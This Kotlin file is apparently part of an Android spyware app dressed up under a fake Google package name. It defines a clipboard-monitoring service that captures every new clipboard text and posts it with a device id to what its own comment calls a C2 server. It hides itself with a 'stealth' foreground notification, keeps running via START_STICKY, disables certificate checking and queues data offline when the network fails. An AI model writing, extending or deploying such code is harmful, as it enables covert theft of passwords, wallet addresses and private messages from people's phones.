package com.google.android.systemservice.services

import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.OfflineDataQueue
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

/**
 * Monitors clipboard changes and sends them to the C2 server.
 */
class ClipboardMonitorService : Service() {

    companion object {
        private const val TAG = "ClipboardMonitor"
    }

    private var clipboardManager: ClipboardManager? = null
    @Volatile private var lastClipText: String = ""
    private val httpClient = TrustAllCertificates.createClientBuilder().build()

    private val clipListener = ClipboardManager.OnPrimaryClipChangedListener {
        try {
            val clip = clipboardManager?.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).coerceToText(this@ClipboardMonitorService).toString()
                if (text.isNotEmpty() && text != lastClipText) {
                    lastClipText = text
                    Log.d(TAG, "Clipboard changed: ${text.take(50)}...")
                    sendClipboardData(text)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading clipboard: ${e.message}")
        }
    }

    override fun onCreate() {
        super.onCreate()
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.CLIPBOARD_SERVICE_ID, notification)

        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
        clipboardManager?.addPrimaryClipChangedListener(clipListener)
        Log.d(TAG, "Clipboard monitoring started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        clipboardManager?.removePrimaryClipChangedListener(clipListener)
        httpClient.dispatcher.executorService.shutdown()
        httpClient.connectionPool.evictAll()
        stopForeground(false)
        super.onDestroy()
    }

    private fun sendClipboardData(text: String) {
        Thread {
            try {
                val json = JSONObject().apply {
                    put("device_id", AndroidConfig.deviceId)
                    put("clipboard_text", text)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("${AndroidConfig.apiBaseUrl}/clipboard")
                    .post(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Clipboard data sent")
                    } else {
                        Log.w(TAG, "Clipboard send failed: ${response.code}, queuing offline")
                        queueOffline(json.toString())
                    }
                }
            } catch (e: IOException) {
                Log.e(TAG, "Network error, queuing clipboard offline: ${e.message}")
                val json = JSONObject().apply {
                    put("device_id", AndroidConfig.deviceId)
                    put("clipboard_text", text)
                    put("timestamp", System.currentTimeMillis())
                }
                queueOffline(json.toString())
            }
        }.start()
    }

    private fun queueOffline(jsonPayload: String) {
        try {
            val queue = OfflineDataQueue(this@ClipboardMonitorService)
            queue.enqueue("clipboard", jsonPayload, AndroidConfig.deviceId)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue offline: ${e.message}")
        }
    }
}
